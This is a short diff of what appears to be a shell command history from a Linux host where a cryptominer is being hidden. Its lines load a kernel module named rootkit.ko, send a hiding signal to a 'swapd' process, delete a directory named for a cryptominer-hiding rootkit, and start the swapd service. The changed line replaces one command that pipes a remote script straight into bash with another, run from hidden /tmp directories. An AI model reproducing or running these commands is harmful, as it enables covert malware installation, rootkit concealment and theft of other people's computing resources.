@@ -650,7 +650,7 @@ dmesg -C && insmod rootkit.ko && dmesg
 kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
 
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -Lso- bench.sh | bash
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -sL yabs.sh | bash
 
 systemctl status swapd
 systemctl start swapd
